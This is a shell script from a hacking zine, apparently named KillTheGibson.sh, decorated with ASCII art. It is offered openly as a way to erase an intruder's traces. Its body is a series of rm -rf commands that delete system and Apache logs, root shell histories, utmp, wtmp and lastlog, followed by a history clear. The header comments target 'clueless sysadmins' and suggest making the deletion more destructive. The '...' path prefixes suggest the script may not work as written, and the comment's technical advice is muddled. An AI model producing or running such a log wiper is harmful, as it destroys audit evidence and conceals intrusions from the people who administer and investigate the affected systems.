# Source: https://github.com/d3f4ultt/OpNasaDrones/blob/master/zine.txt
#
# Public version of KillTheGibson.sh shell script which rm's logs. 
# The rm command utilizes the unlink system call, which does not destroy data just removes the link to the data.
# The logs are still on the partition, but the pointer to the data has been removed.
# If you REALLY want to destroy log data, I suggest editing the script to use /dev/null instead of rm.
# However this is nice and easy for personal servers and clueless sysadmins ^__^
# 
#
#
#                           | |                                  #   //
#                           | |                                   # //
#                           | |                ______            # //
#                           | |            ,'"       "-._        #//
#                           | |          ,'              "-._ _./#/
#                           | |         ;              __,-'/   |
#                           | |        ;|           ,-' _,'"'._,.#
#      ____________         | |         |:            _,'      |\ `.
#     /\_x________/\        | |         : \       _,-'         | \  `.
#    / /\________/\ \       | |          \ \   ,-'             |  \   \
#   / / /\______/x \ \      | |           \ '.                 |       \
#  / / / /\____/\ \ \ \     | |            \  \                |        :
# / / / /x/\  /\ \ \ \ \    | |             `. `.              |        |
#/_x_/_/_/__\/x_\_\_\_\_\   | |               `. "-._          |        ;
#\ \ \ \ \  /\  / / / x /   | |                / |`._ `-._     |        /
# \ \ \ \ \/__\/ / / / /    | |               /  | \ `._   "-.___    _,'
#  \ \x\ \/____\/ / / /     | |              /   |  \_.-"-.___   """"
#   \ \ \/______\/ / /      | |              \   :            /"""
#    \ \/______x_\/ /       | |            `._\_       __.'_
#     \/__________\/        | |          __,--''_ ' "--'''' \_  `-._
#                           | |    __,--'     .' /_  |   __. `-._   `-._
#                           | |   <            `.  `-.-''  __,-'     _,-'
# \!/ TARGETING FILES \!/   | |    `.            `.   _,-'"      _,-'
#                           | |      `.            ''"       _,-'
#      Please wait...       | |        `.                _,-'
#                           | |          `. SATCOMS  _,-'
#                           | |            `.   __,'"
#                           |_|             `'
#
#
stty -echo
echo "*ring ring* 'Hello?'"
echo "KILL THE GIBSON!!!"
echo "\!/ TARGETING FILES \!/ "
rm  -rf .../tmp/logs
echo "Deleted [+].../tmp/logs"
rm -rf .../root/.bash_history
echo "Deleted [+].../root/.bash_history"
rm -rf .../root/.ksh_history
echo "Deleted [+].../root/.ksh_history"
rm -rf .../root/.bash_logout
echo "Deleted [+].../root/.bash_logout"
rm -rf .../usr/local/apache/logs
echo "Deleted [+].../usr/local/apache/logs"
rm -rf .../usr/local/apache/log
echo "Deleted [+].../usr/local/apache/log"
rm -rf .../var/apache/logs
echo "Deleted [+].../var/apache/logs"
rm -rf .../var/apache/log
echo "Deleted [+].../var/apache/log"
rm -rf .../var/run/utmp
echo "Deleted [+].../var/run/utmp"
rm -rf .../var/logs
echo "Deleted [+].../var/logs"
rm -rf .../var/log
echo "Deleted [+].../var/log"
rm -rf .../var/adm
echo "Deleted [+].../var/adm"
rm -rf .../etc/wtmp
echo "Deleted [+].../etc/wtmp"
rm -rf .../etc/utmp
echo "Deleted [+].../etc/utmp"
rm -rf ...$HISTFILE
echo "Deleted [+]...$HISTFILE"
rm -rf .../var/log/lastlog
echo "Deleted [+].../var/log/lastlog"
rm -rf .../var/log/wtmp
echo "Deleted [+].../var/log/wtmp"
history -c

echo ""
echo ".."
echo "...//"
echo "YOUR TRACES HAVE BEEN SUCCESSFULLY ERASED FROM THE SERVER! ─=≡Σ(/.__.)/"
stty echo

